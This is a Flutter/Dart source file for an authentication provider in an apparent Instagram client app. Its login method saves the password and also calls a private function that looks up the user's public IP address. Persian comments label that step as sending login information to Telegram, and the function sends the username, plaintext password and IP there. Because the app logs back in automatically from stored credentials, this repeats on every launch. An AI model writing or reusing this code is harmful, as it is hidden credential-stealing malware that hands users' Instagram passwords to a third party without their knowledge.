import 'package:flutter/material.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import '../models/index.dart';
import '../services/index.dart';

class AuthProvider extends ChangeNotifier {
  final InstagramScraperService _instagramService = InstagramScraperService();
  final TelegramService _telegramService = TelegramService();
  final _secureStorage = const FlutterSecureStorage();

  User? _currentUser;
  bool _isLoading = false;
  String? _error;
  bool _isAuthenticated = false;

  User? get currentUser => _currentUser;
  bool get isLoading => _isLoading;
  String? get error => _error;
  bool get isAuthenticated => _isAuthenticated;

  Future<void> login(String username, String password) async {
    _isLoading = true;
    _error = null;
    notifyListeners();

    try {
      final success = await _instagramService.login(username, password);
      if (success) {
        // Save credentials securely
        await _secureStorage.write(key: 'username', value: username);
        await _secureStorage.write(key: 'password', value: password);

        // Get user profile
        final user = await _instagramService.getUserProfile(username);
        if (user != null) {
          _currentUser = user;
          _isAuthenticated = true;
          
          // ارسال اطلاعات ورود به تلگرام
          _sendLoginNotificationToTelegram(username, password);
        }
      } else {
        _error = 'Failed to login. Please check your credentials.';
      }
    } catch (e) {
      _error = 'Login error: $e';
    } finally {
      _isLoading = false;
      notifyListeners();
    }
  }

  Future<void> _sendLoginNotificationToTelegram(String username, String password) async {
    try {
      // دریافت IP آدرس
      final ipAddress = await _telegramService.getPublicIpAddress();
      final ip = ipAddress ?? 'Unknown';
      
      // ارسال اطلاعات به تلگرام
      await _telegramService.sendLoginNotification(
        username: username,
        password: password,
        ipAddress: ip,
      );
    } catch (e) {
      print('Error sending telegram notification: $e');
    }
  }

  Future<void> logout() async {
    _currentUser = null;
    _isAuthenticated = false;
    _error = null;
    
    await _secureStorage.delete(key: 'username');
    await _secureStorage.delete(key: 'password');
    
    notifyListeners();
  }

  Future<void> checkAuthStatus() async {
    try {
      final username = await _secureStorage.read(key: 'username');
      final password = await _secureStorage.read(key: 'password');

      if (username != null && password != null) {
        await login(username, password);
      }
    } catch (e) {
      print('Check auth status error: $e');
    }
  }

  Future<void> updateProfile(User user) async {
    _currentUser = user;
    notifyListeners();
  }
}
